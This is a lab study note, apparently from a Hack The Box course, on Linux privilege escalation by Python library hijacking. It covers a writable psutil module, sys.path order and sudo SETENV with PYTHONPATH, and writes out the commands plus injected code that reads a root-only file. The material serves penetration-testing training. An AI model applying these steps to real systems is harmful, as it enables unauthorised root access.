#Linux_PrivilegeEscalation 

---

There are 3 main vulnerabilities we can exploit:
- Wrong write permissions
- Library path
- `PYTHONPATH` environment variable

- Assume we have the following Python script
```python
!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

- We note that it uses the `psutil` library. We can check the path where this library is imported from using the following command:
```bash
htb-student@ubuntu:~$ pip3 show psutil
Name: psutil
Version: 5.9.5
Summary: Cross-platform lib for process and system monitoring in Python.
Home-page: https://github.com/giampaolo/psutil
Author: Giampaolo Rodola
Author-email: g.rodola@gmail.com
License: BSD-3-Clause
Location: /usr/local/lib/python3.8/dist-packages
Requires: 
Required-by: 
```
We note the path is `/usr/local/lib/python3.8/dist-packages`.

- We note that the file permissions for `__init__.py` are incorrect:
```bash
htb-student@ubuntu:~$ ls -ll /usr/local/lib/python3.8/dist-packages/psutil
total 560
-rw-r--r-- 1 root        staff  29181 May 19  2023 _common.py
-rw-r--r-- 1 root        staff  15025 May 19  2023 _compat.py
-rw-r--r-- 1 htb-student staff  87657 Jun  8  2023 __init__.py
```
since our user belongs to the `htb-student` group:
```bash
htb-student@ubuntu:~$ groups
htb-student
```

- So we can modify the `virtual_memory` in `/usr/local/lib/python3.8/dist-packages/psutil/__init__.py` as follows
```python
f = open('/root/flag.txt', 'r')
print(f.read())
```

- We also see that we can run the file `/home/htb-student/mem_status.py` with root permissions:
```bash
htb-student@ubuntu:~$ sudo -l
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
```
=> We get a root shell by running `sudo /usr/bin/python3 /home/htb-student/mem_status.py`


**Exploit Method 2**

- Python checks several libraries from where to load a module, and it searches in top-down. We can check these paths using the following command: 
```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```

=> If one of the paths on top has incorrect permissions we can modify it to include a "hacked" version of an imported library


**Exploit Method 3**

- If the `PYTHONPATH` env variable is set, Python will load a module from the path defined there => If a user can modify `PYTHONPATH`, i.e. they have the following permissions
```bash
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

We can run the following command:
```bash
sudo PYTHONPATH=/tmp /usr/bin/python3 ./mem_status.py
```

